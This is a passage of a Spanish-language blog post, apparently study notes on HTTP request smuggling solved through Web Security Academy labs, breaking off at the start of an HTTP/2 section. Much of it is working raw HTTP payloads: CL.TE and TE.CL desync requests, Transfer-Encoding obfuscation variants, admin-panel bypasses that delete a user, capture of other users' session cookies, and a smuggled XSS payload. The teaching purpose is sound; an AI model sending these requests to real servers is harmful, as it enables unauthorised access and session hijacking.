+    <p>De entre los servidores que si admiten dicha cabecera pueden ser inducidos a no procesarla si esta se ofusca de ciertas formas.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="3-ejecutando-el-ataque">3. Ejecutando el ataque.</h3>
+
+<p>En términos muy simples, el <em>HTTP request smuggling attack</em> se efectúa introduciendo ambas cabeceras <em>Content-Length</em> y <em>Transfer-Encoding</em> en una request HTTP para provocar una inferencia en el procesamiento de la misma en el back-end.</p>
+
+<p>Técnicamente el proceso en el que este se lleva a cabo depende del comportamiento de la cadena de servidores involucrada. Suponiéndo que sean dos servidores (front-end server y back-end server) distinguimos los siguientes casos:</p>
+
+<ul>
+  <li>
+    <p><strong>CL.TE</strong>: El front-end utiliza la cabecera Content-Length y el back-end emplea el Transfer-Encoding.</p>
+  </li>
+  <li>
+    <p><strong>TE.CL</strong>: Es el contexto inverso.</p>
+  </li>
+  <li>
+    <p><strong>TE.TE.</strong>: Ambos emplean la cabecera <em>Transfer-Encoding</em>.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h4 id="32-vulnerabilidades-clte">3.2. Vulnerabilidades CL.TE.</h4>
+
+<p>En este contexto, podemos emplear una request como la siguiente:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+</code></pre>
+
+<p>De esta manera, el servidor front-end procesa la cabecera <em>Content-Length</em> y asume que el tamaño de la request es 13 (hasta el final de SMUGGLED, contando cada caracter y cada salto de línea) y se la envía al servidor del back-end.</p>
+
+<p>En el back-end, el servidor por el contrario procesa la Transfer-Encoding y trata el mensaje como si estuviera codificada en fragmentos, de forma que analiza el primer fragmento que resulta ser un 0 y por tanto lo interpreta como el final de la request y trata los bytes correspondientes al término SMUGGLED como el inicio de la siguiente request.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 1: HTTP request smuggling, basic CL.TE vulnerability</strong></p>
+
+<p>Este laboratorio simula una aplicación web que emplea dos servidores (front/back-end) para procesar las request.</p>
+
+<p>El front no procesa codificación en fragmentos y devuelve cualquier request cuyo método no sea GET o POST.</p>
+
+<p>Para resolver este laboratorio manipula el procesamiento de una request en el back-end de forma que la siguiente request aparente utilizar un método que no coincida con GET o POST y sea desechada.</p>
+
+<p>Nos introducimos en el laboratorio e introducimos la siguiente request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Connection: keep-alive
+Cookie:your-cookie
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+</code></pre>
+
+<p>De forma:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220514193132.png" text-align="center" />
+</div>
+
+<p>Y al intentar emitirla dos veces obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220514193200.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h4 id="33-tecl-vulnerabilities">3.3. TE.CL Vulnerabilities.</h4>
+
+<p>En esta ocasión, empleamos la siguiente request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+
+8
+SMUGGLED
+0
+</code></pre>
+
+<p>Notemos que en este caso hay dos saltos de línea antes del 8. Para enviar esta solicitud usando Burp Repeater, primero deberá ir al menú y asegurarse de que la opción “Update Content-Length” no esté marcada.Debe incluir la secuencia final \r\n\r\n después del 0 final.</p>
+
+<p>Así, el procedimiento va como sigue, en primer lugar, el servidor del front-end procesa la cabecera <em>Transfer-Encoding</em> y envía la request entera, seguidamente, en el servidor del back-end se procesa la cabecera <em>Content-Length</em> por la que interpreta que el cuerpo de la request contiene 3 bytes; los dos saltos de línea y el 8 y considera que los bytes que constituyen el término SMUGGLED pertenecen a la siguiente request.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 2: HTTP request smuggling, basic TE.CL vulnerability</strong> (No funciona: problemas al introducir la cabecera Transfer- Encoding).</p>
+
+<p>Esta práctica de laboratorio incluye un servidor front-end y back-end, y el servidor back-end no admite la codificación fragmentada. El servidor front-end rechaza las solicitudes que no utilizan el método GET o POST.</p>
+
+<p>Para resolver el laboratorio, pase de contrabando una solicitud al servidor de back-end, de modo que la próxima solicitud procesada por el servidor de back-end parezca usar el método GPOST.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220515015822.png" text-align="center" />
+</div>
+
+<p>Y envíamos la siguiente request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+</code></pre>
+
+<p>De esta, forma, el servidor del front-end procesará la cabecera Transfer-Encoding y mandará toda la request al servidor del back end que procesará la cabecera Content-Length y sólo incluirá como parte del cuerpo de la request los cuatro primeros bytes, excluyéndo el resto para la siguiente request.</p>
+
+<p><br /></p>
+
+<h4 id="34-tete-ofuscación-de-la-cabecera-te">3.4. TE.TE. Ofuscación de la cabecera TE.</h4>
+
+<p>Aquí, los servidores front-end y back-end admiten el encabezado Transfer-Encoding, pero se puede inducir a uno de los servidores a no procesarlo ofuscando el encabezado de alguna manera.</p>
+
+<p>Hay formas potencialmente infinitas de ofuscar el encabezado Transfer-Encoding. Por ejemplo:</p>
+
+<ul>
+  <li>Transfer-Encoding: xchunked</li>
+  <li>Transfer-Encoding : chunked</li>
+  <li>Transfer-Encoding: chunked</li>
+  <li>Transfer-Encoding: x</li>
+  <li>Transfer-Encoding:[tab]chunked [space]</li>
+  <li>Transfer-Encoding: chunked X: X[\n]</li>
+  <li>[SPACE]Transfer-Encoding: chunked</li>
+  <li>X: X[\n]Transfer-Encoding : chunked</li>
+  <li>
+    <dl>
+      <dt>Transfer-Encoding</dt>
+      <dd>chunked</dd>
+    </dl>
+  </li>
+</ul>
+
+<p>Cada una de estas técnicas implica una desviación sutil de la especificación HTTP. El código real que implementa una especificación de protocolo rara vez se adhiere a ella con absoluta precisión y es común que diferentes implementaciones toleren diferentes variaciones de la especificación. <strong>Para descubrir una vulnerabilidad TE.TE, es necesario encontrar alguna variación del encabezado Transfer-Encoding de modo que solo uno de los servidores front-end o back-end lo procese, mientras que el otro servidor lo ignore.</strong></p>
+
+<p>Dependiendo de si es el servidor front-end o el back-end el que puede ser inducido a no procesar el encabezado Transfer-Encoding ofuscado, el resto del ataque tomará la misma forma que para las vulnerabilidades CL.TE o TE.CL. ya descrito.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 3: HTTP request smuggling, obfuscating the TE header</strong></p>
+
+<p>Este laboratorio involucra un servidor front-end y back-end, y los dos servidores manejan encabezados de solicitud HTTP duplicados de diferentes maneras. El servidor front-end rechaza las solicitudes que no utilizan el método GET o POST.</p>
+
+<p>Para resolver el laboratorio, pase de contrabando una solicitud al servidor de back-end, de modo que la próxima solicitud procesada por el servidor de back-end parezca usar el método GPOST.</p>
+
+<p>En primer lugar, accedemos al laboratorio y empezamos a mandar request con la cabecera Transfer-Encoding duplicada y con valores ofuscados para conseguir que los servidores procesen cabeceras distintas. Finalmente, la request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Cookie: session=cookiesession
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+x=1
+0
+</code></pre>
+
+<p>Finalmente termina dando resultado.</p>
+
+<p><br /></p>
+
+<h3 id="4-identificación-de-vulnerabilidades-http-request-smuggling">4. Identificación de vulnerabilidades HTTP request smuggling.</h3>
+
+<p>En general con Burp Scanner es suficiente para detectar vulnerabilidades de HTTP request smuggling. Sin embargo, vamos a ver diversos métodos de detección:</p>
+
+<p><br /></p>
+
+<h4 id="41-técnicas-basadas-en-sincronización">4.1. Técnicas basadas en sincronización.</h4>
+
+<p><strong>CL.TE utilizando técnicas de sincronización</strong></p>
+
+<p>Si una aplicación es vulnerable a HTTP Request Smuggler, una request como esta provocará un retraso:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+</code></pre>
+
+<p>Dado que el servidor front-end usa el Content-Length encabezado, solo reenviará una parte de esta solicitud, omitiendo el X. El servidor back-end usa el Transfer-Encoding encabezado, procesa el primer fragmento y luego espera a que llegue el siguiente fragmento. Esto causará un retraso de tiempo observable.</p>
+
+<p><strong>TE.CL empleando técnicas de sincronización</strong></p>
+
+<p>De la misma forma que en caso anterior, si una aplicación es vulnerable a TE.CL, entonces la sigueitne request genererá un retraso:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length:
+
+6
+0
+X
+</code></pre>
+
+<p>Dado que el servidor front-end usa el Transfer-Encoding encabezado, solo reenviará una parte de esta solicitud, omitiendo el  X . El servidor back-end usa el  Content-Length encabezado, espera más contenido en el cuerpo del mensaje y espera a que llegue el contenido restante. Esto causará un retraso de tiempo observable.</p>
+
+<p><br /></p>
+
+<h4 id="42-confirmación-de-vulnerabilidades">4.2. Confirmación de vulnerabilidades.</h4>
+
+<p>Cuando se detecta una probable vulnerabilidad de contrabando de solicitudes, puede obtener más evidencia de la vulnerabilidad explotándola para desencadenar diferencias en el contenido de las respuestas de la aplicación. Esto implica enviar dos solicitudes a la aplicación en rápida sucesión:</p>
+
+<ul>
+  <li>Una solicitud de “ataque” diseñada para interferir con el procesamiento de la siguiente solicitud.</li>
+  <li>Una solicitud “normal”.</li>
+</ul>
+
+<p><strong>Confirmación de vulnerabilidades de CL.TE mediante respuestas diferenciales</strong></p>
+
+<p>Para confirmar una vulnerabilidad CL.TE, enviaría una solicitud de ataque como esta:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/search</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">49</span>
+<span class="na">Transfer-Encoding</span><span class="p">:</span> <span class="s">chunked</span>
+
+e
+q=smuggling&amp;x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+</code></pre></div></div>
+
+<p>Con esta request el primer servidor lleva todo al segundo servidor y este último transporta la request hasta el 0 y deja lo demás para la siguiente request. La siguiente request lleva un código de error que provoca un respuesta 404.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 4: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses</strong></p>
+
+<p>Esta laboratorio envuelve una cadena de servidores front-end y back-end en el que el primero no procesa los datos fragmentos (no procesa el Transfer-Encoding Header).</p>
+
+<p>Así, mandamos la siguiente request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: laburl
+Cookie: session=sessioncookie
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a020086035dd240c0d4756e00ee00e9.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+</code></pre>
+
+<p>Y al mandar dos veces la request:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220623180208.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>Confirmando vulnerabilidades TE.CL mediante respuestas diferenciales</strong></p>
+
+<p>Para confirmar una vulnerabilidad TE.CL, enviaría una solicitud de ataque como esta:</p>
+
+<pre><code class="language-HTTP">POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7c
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+x=
+0
+</code></pre>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 5: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses</strong></p>
+
+<p>Lanzamos la request anterior adheriendo la parte que comienza desde Content-Type hasta el final a una request normal al sitio web y la lanzamos dos veces desde el repeater obteniendo en la segunda repeater el error 404.</p>
+
+<p><br /></p>
+
+<h3 id="5-exploiting-http-request-smuggling">5. Exploiting HTTP Request Smuggling.</h3>
+
+<p>Ahora que tenemos nociones básicas acerca de cómo funciona el Request Smuggling, vamos a ver en qué contextos podemos utilizarlos para llevar a cabo qué ataques:</p>
+
+<p><br /></p>
+
+<h4 id="51-bypass-front-end-security-controls">5.1. Bypass front-end security controls.</h4>
+
+<p>En algunas aplicaciones, el servidor front-end se utiliza para implementar algunos controles de seguridad, decidiendo si se permite el procesamiento de solicitudes individuales. Las solicitudes permitidas se reenvían al servidor de back-end, donde se considera que han pasado por los controles de front-end.</p>
+
+<p>Por ejemplo, suponga que una aplicación utiliza el servidor front-end para implementar restricciones de control de acceso y solo reenvía solicitudes si el usuario está autorizado para acceder a la URL solicitada. El servidor back-end acepta posteriormente cada solicitud sin más verificación. </p>
+
+<p>En esta situación, se puede emplear un ataque de HTTP Request Smuggling para eludir los controles de acceso, pasando de contrabando una solicitud a una URL restringida. Supongámos que el usuario tiene acceso al /home pero no al /admin:</p>
+
+<pre><code class="language-HTTP">POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+</code></pre>
+
+<p><br /></p>
+
+<p>El primer servidor asume toda el contenido como una única request dirigida a /home procesando el contenido de la cabecera Content-Length mientras que el servidor back-end (que no lleva a cabo ninguna medida de seguridad debido a la confianza que deposita en el front-end) procesa la cabecera Transfer-Encoding observa que hay dos solicitudes, una para /home y otra para /admin.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 6: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</strong></p>
+
+<p>Este laboratorio contiene un servidor front-end que no procesa los datos fragmentados y un servidor back-end.</p>
+
+<p>Al acceder al laboratorio observamos que tenemos el paht a /admin bloqueado. De esta forma y con la finalidad de realizar un bypass mandamos la siguiente request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-Ignore: X
+</code></pre>
+
+<p>Sin embargo, nos aparece un mensaje de error informandomos de que el /admin path está reservado para usuarios locales. De forma que añadimos las siguientes cabeceras:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+</code></pre>
+
+<p>Y vemos que tenemos acceso al panel de administrador. Sólo queda modificar la request anterior para borrar al usuario carlos modificando la URL: GET /admin/delete?username=carlos HTTP/1.1</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 7: Exploit HTTP request smuggling to bypass front-end security controls, TE.CL vulnearbility</strong></p>
+
+<p>De la misma forma que en el laboratorio anterior manejamos de forma maliciosa las cabeceras Transfer-Encoding y Content-Type para introducir una request a /admin que no sea procesada por el fornt end pero si por el back-end.</p>
+
+<p>Pero finalmente terminamos intrudociendo:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+87
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+</code></pre>
+
+<p><br /></p>
+
+<h4 id="52-revealing-front-end-request-rewriting">5.2. Revealing front-end request rewriting.</h4>
+
+<p>Puede ser que el servidor front-end reescriba la solicitud antes de reenviarla al servidor back-end. Esto puede utilizarse para conseguir que en dicha reescritura se incorpore contenido malicioso en la request.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 8: Exploiting HTTP request smuggling to reveal front-end request rewriting</strong></p>
+
+<p>Este laboratorio involucra un servidor front-end que reescribe las solicitudes que manda al back-end y no procesa los datos fragmentados.</p>
+
+<p>Hay un panel de administrador que sólo es accesible para usuarios locales y el servidor front-end añade una cabecera que contiene la IP del solicitante.</p>
+
+<p>La aplicación web contiene una barra de búsqueda que refleja el input introducido en la respuesta HTTP. De esta forma, envíamos la siguiente request:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+Connection: close
+
+search=test
+</code></pre>
+
+<p>Así, como el servidor front-end no procesa la Transfer-Encoding Header, envía todo como si fuera una única request al servidor back-end y este divide el contenido en dos request, en el cual el segundo tiene un tamaño de 200 bytes. De esta forma, cerca de 200 bytes de información de la sigueiten request se adhiere al parámetro search test que se refleja en la respuesta HTTP:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220625193216.png" text-align="center" />
+</div>
+
+<p>Así tenemos acceso directo a la forma en la que el servidor del front end reescribe las request antes de enviarlas al servidor del back-end y es importante notar la cabecera X-DrGgIK-Ip: ip, que contiene la IP del solicitante.</p>
+
+<p>Basándonos en esta inforamción, enviamos un GET /admin con dicha cabecera:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+0
+
+
+
+GET /admin HTTP/1.1
+X-DrGgIK-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+</code></pre>
+
+<p><br /></p>
+
+<p>Observamos que da resultado y en consecuencia modificamos la URL para borrar al usuario carlos y completar así el laboratorio.</p>
+
+<p><br /></p>
+
+<h4 id="53-capturando-requests-de-otros-usuarios">5.3. Capturando requests de otros usuarios.</h4>
+
+<p>Si la aplicación contiene algún tipo de funcionalidad que permita almacenar y/o recuperar datos textuales, entonces se puede utilizar el HTTP Request Smuggling para capturar el contenido de las solicitudes de otros usuarios. Estos probablemente incluirán tokens de sesión, habilitación de ataques de secuestro de sesión u otros datos confidenciales enviados por el usuario. Las funciones adecuadas para usar como vehículo para este ataque serían comentarios, correos electrónicos, descripciones de perfil, nombres de pantalla, etc.</p>
+
+<p>Para realizar el ataque, debe pasar de contrabando una solicitud que envíe datos a la función de almacenamiento, con el parámetro que contiene los datos ubicado en último lugar en la solicitud. Tal y como hemos hecho en el ejemplo anterior:</p>
+
+<pre><code class="language-HTTP">
+GET / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 324
+
+0
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=2&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=https%3A%2F%2Fnormal-user.net&amp;comment=
+</code></pre>
+
+<p>De nuevo, como el Content-Length contiene una cantidad más exagerada de bytes que la que se aporta en la request, el contenido de la siguiente request se adherira al parámetro comment que se verá reflejada en la sección de comentarios:</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 9: Obteniendo contenido de las requests de otros usuarios</strong></p>
+
+<p>Este laboratorio involucra un servidor front-end y back-end, y el servidor front-end no admite la codificación fragmentada.</p>
+
+<p>Para resolver el laboratorio, vamos a pasar de contrabando una solicitud al servidor back-end que hace que la solicitud del siguiente usuario se almacene en la aplicación. Luego recupere la solicitud del próximo usuario y use las cookies del usuario víctima para acceder a su cuenta:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 256
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=your-session-token
+csrf=your-csrf-token&amp;postId=5&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=&amp;comment=test
+</code></pre>
+
+<p>Por un fallo del laboratorio el usuario Carlos no tiene cookie de sesión y por tanto este no puede ser completado. Pero esa sería la resolución del laboratorio.</p>
+
+<p><br /></p>
+
+<h4 id="54-using-http-request-smuggler-to-perfom-xss-attacks">5.4. Using HTTP Request smuggler to perfom XSS attacks.</h4>
+
+<p>Si una aplicación es vulnerable al contrabando de solicitudes HTTP y también contiene una vulnerabilidad Reflected XSS, puede usar un ataque de Request Smuggling para atacar a otros usuarios de la aplicación. Este enfoque es superior a la explotación normal de XSS reflejado de dos maneras:</p>
+
+<ul>
+  <li>No requiere interacción con los usuarios víctimas. Simplemente pase de contrabando una solicitud que contenga el payload y la siguiente solicitud del usuario procesada por el servidor back-end se verá afectada.</li>
+  <li>Se puede usar para explotar el comportamiento de XSS en partes de la solicitud que no se pueden controlar de manera trivial en un ataque XSS reflejado normal, como los encabezados de solicitud HTTP.</li>
+</ul>
+
+<p><br /></p>
+
+<p>Por ejemplo, suponga que una aplicación tiene una vulnerabilidad XSS reflejada en el User-Agent encabezado. Puede explotar esto en un ataque de contrabando de solicitudes de la siguiente manera:</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 63
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+User-Agent: &lt;script&gt;alert(1)&lt;/script&gt;
+Foo: X
+</code></pre>
+
+<p>La solicitud del próximo usuario se adjuntará a la solicitud de contrabando y recibirá la carga útil de XSS reflejada en la respuesta.</p>
+
+<p><br /></p>
+
+<p>**Laboratorio 10:</p>
+
+<p><br /></p>
+
+<h3 id="6-advanced-http-request-smuggling-y-http2-request-smuggling">6. Advanced HTTP Request Smuggling y HTTP/2 Request Smuggling.</h3>
+
+<h4 id="61-introducción">6.1. Introducción.</h4>
+
+<p>En esta sección, le mostraremos cómo, contrariamente a la creencia popular, la implementación de HTTP/2 en realidad ha hecho que muchos sitios web sean más vulnerables al contrabando de solicitudes, incluso si antes estaban a salvo de este tipo de ataques.</p>
+
+<p><br /></p>
+
+<h4 id="62-http2-message-length">6.2. HTTP/2 message length.</h4>
+
+<p>Como sabemos, <strong>el HTTP Request Smuggling se trata fundamentalmente de explotar las discrepancias entre cómo los diferentes servidores interpretan la longitud de una solicitud</strong>. HTTP/2 introduce un mecanismo único y robusto para hacer esto, que durante mucho tiempo se pensó que lo haría inherentemente inmune al HTTP Request Smuggling.</p>
+
+<p>Aunque no verá esto en Burp, <strong>los mensajes HTTP/2 se envían como una serie de “marcos” separados. Cada marco está precedido por un campo de longitud explícito, que le dice al servidor exactamente cuántos bytes leer. Por lo tanto, la longitud de la solicitud es la suma de las longitudes de sus marcos</strong>.</p>
+
+<p>En teoría, <strong>este mecanismo significa que no hay posibilidad de que un atacante introduzca la ambigüedad necesaria para el contrabando de solicitudes, siempre que el sitio web utilice HTTP/2 de extremo a extremo. Sin embargo, en la naturaleza, este no suele ser el caso debido a la práctica generalizada pero peligrosa de degradar HTTP/2</strong>.</p>
+
+<p><br /></p>
+
+<h4 id="63-http2-downgrading">6.3. HTTP/2 Downgrading.</h4>
+
+<p>La degradación de HTTP/2 es el proceso de reescribir solicitudes HTTP/2 utilizando la sintaxis HTTP/1 para generar una solicitud HTTP/1 equivalente. Los servidores web y los proxies inversos a menudo hacen esto para ofrecer soporte HTTP/2 a los clientes mientras se comunican con servidores back-end que solo interpretan HTTP/1. <strong>Esta práctica es un requisito previo para muchos de los ataques cubiertos en esta sección</strong>.</p>
+
+<p>Es decir, aunque HTTP/2 sea robusto, el degradado de HTTP/2 a HTTP/1 expone HTTP2 a las vulnerabilidades que tenía HTTP/1.</p>
+
+<p><br /></p>
+
+<h4 id="64-vulnerabilidades">6.4. Vulnerabilidades.</h4>
+
+<h5 id="641-vulnerabilidades-h2cl">6.4.1. Vulnerabilidades H2.CL.</h5>
+
+<p>Este se basa en introducir una cabecera Content-Type engañosa.</p>
+
+<p>Las HTTP/2 no suelen llevar una cabecera Content-Type y cuando lo hacen al degredar la request a HTTP/1 se copia el valor que esta tiene. De otro modo simplemente se adhiere a la request degradada una cabecera Content-Type cuyo valor coincide con el número de bytes de la request calculada mediante el mecanismo de longitud integrado de HTTP/2 ya mencionado anteriormente.</p>
+
+<p>En cualquier caso, <strong>la especificación dicta que cualquier  header content-length de una solicitud HTTP/2 debe coincidir con la longitud calculada mediante el mecanismo incorporado, pero esto no siempre se valida correctamente antes de degradar</strong>. Como resultado, es posible pasar de contrabando solicitudes mediante la inserción de un content-length encabezado engañoso. </p>
+
+<p>Así:</p>
+
+<ul>
+  <li>
+    <p>aunque el front-end utilizará la longitud implícita de HTTP/2 para determinar dónde termina la solicitud.</p>
+  </li>
+  <li>
+    <p>el back-end de HTTP/1 tiene que hacer referencia al Content-Length encabezado derivado del que inyectó.</p>
+  </li>
+</ul>
+
+<p>Esto resulta en una desincronización similar a la que obteníamos con las cabeceras Content-Type y Transfer-Encoding.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220625113411.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 6: H2.CL request smugling</strong></p>
+
+<p>Este laboratorio es vulnerable a Request Smuggling porque el servidor front-end degrada de HTTP/2 a HTTP/1 al comunicarse con el servidor del back-end.</p>
+
+<p>Para resolver este laboratorio vamos a realizar un ataque de Request Smuggling en el navegador de la víctima.</p>
+
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#burp">burp</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=21.+HTTP+Request+Smuggling.&url=http%3A%2F%2Flocalhost%3A4000%2F2022-03-26-21.HTTP_request_smuggling%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-03-26-21.HTTP_request_smuggling%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-03-26-21.HTTP_request_smuggling%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2022-03-25-20.HTTP_Host_header_attacks/" data-toggle="tooltip" data-placement="top" title="20. HTTP Host Header Attacks.">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="page-item next">
+          <a class="page-link" href="/2022-03-27-22.OAuth_authentication/" data-toggle="tooltip" data-placement="top" title="22. OAuth Authentication.">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="/feed.xml" title="RSS">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">RSS</span>
+    </a>
+  </li><li class="list-inline-item">
